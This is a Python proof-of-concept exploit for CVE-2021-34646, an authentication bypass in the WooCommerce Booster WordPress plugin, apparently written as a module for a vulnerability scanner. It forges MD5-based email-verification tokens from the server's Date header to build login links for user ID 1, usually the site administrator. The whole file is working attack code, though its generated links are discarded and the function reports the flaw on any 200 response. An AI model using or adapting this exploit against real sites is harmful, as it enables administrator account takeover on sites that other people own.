# coding: utf-8
import requests
import calendar
import hashlib
import base64
import email.utils

def email_time_to_timestamp(s):
    tt = email.utils.parsedate_tz(s)
    if tt is None: return None
    return calendar.timegm(tt) - tt[9]

#WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
def poc(url,user_agent,proxy):

    id='1'
    url = url.strip("/")
    ajax_action = "/?wcj_user_id=" + id
    exp_url = url + ajax_action

    header = {'User-Agent': user_agent}

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.get(exp_url, headers=header, proxies=proxies)
    else:
        response = requests.get(exp_url, headers=header)

    if response.status_code==200 :
        date = response.headers["Date"]
        unix = email_time_to_timestamp(date)
        for i in range(3):
            hash = hashlib.md5(str(unix - i).encode()).hexdigest()
            token = '{"id":"' + id + '","code":"' + hash + '"}'
            token = base64.b64encode(token.encode()).decode()
            token = token.rstrip("=")  # remove trailing =
            link = url + "/my-account/?wcj_verify_email=" + token
            re_link="# " + str(i) + " link for hash ：" + hash + ":\n"+link
        return 'WordPress Plugin WooCommerce Booster Plugin 5.4.3 - 认证旁路漏洞    CVE-2021-34646'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','127.0.0.1:8080')
